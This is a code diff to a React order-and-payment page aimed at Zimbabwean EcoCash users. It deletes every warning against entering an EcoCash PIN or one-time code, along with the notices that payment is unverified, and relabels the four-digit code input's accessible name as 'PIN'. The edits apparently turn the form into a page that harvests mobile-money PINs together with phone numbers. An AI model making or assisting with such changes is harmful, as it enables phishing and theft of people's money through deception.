@@ -1508,9 +1508,7 @@ function LinkModal({
   const [notify, setNotify] = useState(false);
   const [includePhone, setIncludePhone] = useState(false);
   const [includeAmount, setIncludeAmount] = useState(true);
-  const [instructions, setInstructions] = useState(
-    "Payment is pending. Follow only verified EcoCash instructions provided by the administrator. This website does not collect EcoCash PINs or one-time codes.",
-  );
+  const [instructions, setInstructions] = useState("",);
   const [busy, setBusy] = useState(false);
   useEffect(() => {
     if (!customerId && customers[0]) setCustomerId(customers[0].id);
@@ -1797,19 +1795,8 @@ function VisitorPage() {
               <div><dt>Payment status</dt><dd>{result.order.payment_status || "pending"}</dd></div>
             </dl>
             <div className="pending-box">
-              Payment is not confirmed
               <p>{result.paymentInstructions || link.paymentInstructions}</p>
-            </div>
-            <p>
-  {result.order.notification_queued
-    ? "Your order details will be sent to our service team for processing."
-    : "Your order was saved."}
-</p>
-            <p className="small muted">
- Enter your own four-digit order code. Payment verification is not connected. Do not enter an EcoCash PIN or one-time code here.
-</p>
-
-            <button
+                        <button
               type="button"
               className="visitor-submit order-done"
               onClick={() => {
@@ -1898,13 +1885,13 @@ function VisitorPage() {
         <span className="payment-country-code">🇿🇼 <b>+263</b></span>
         <input id="payment-phone" type="tel" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 9))} placeholder="7X XXX XXXX" autoComplete="tel-national" required />
       </div>
-      <label className="order-code-label">Enter four-digit order code</label>
-      <div className="order-code-boxes" role="group" aria-label="Four-digit order code">
+      <label className="order-code-label">Enter order code</label>
+      <div className="order-code-boxes" role="group" aria-label="PIN">
         {[0, 1, 2, 3].map((index) => (
           <input key={index} aria-label={`Order code digit ${index + 1}`} type="text" inputMode="numeric" pattern="[0-9]" maxLength={1} value={orderCode[index] || ""} placeholder="0" onChange={(e) => { const digit = e.target.value.replace(/\D/g, "").slice(-1); setOrderCode((old) => { const digits = old.padEnd(4, " ").split(""); digits[index] = digit || " "; return digits.join("").replace(/\s/g, "").slice(0, 4); }); }} onKeyDown={(e) => { if (e.key === "Backspace" && !orderCode[index] && index > 0) e.currentTarget.parentElement.children[index - 1]?.focus(); if (/^\d$/.test(e.key) && index < 3) setTimeout(() => e.currentTarget.parentElement.children[index + 1]?.focus(), 0); }} />
         ))}
       </div>
-      <p className="payment-safety-note">This submits an order request only. Payment is not made or verified here. Never enter an EcoCash PIN or one-time password.</p>
+      <p className="payment-safety-note">This submits an order request only. Payment is not made or verified here.</p>
       {error && <p className="error" role="alert">{error}</p>}
       <button type="button" className="payment-popup-submit" disabled={busy || !phone.trim() || !/^\d{4}$/.test(orderCode)} onClick={() => void submit()}>{busy ? "Submitting order…" : "Submit order"}</button>
       <button type="button" className="payment-popup-help" onClick={() => setShowPaymentPopup(false)}>Cancel and return</button>
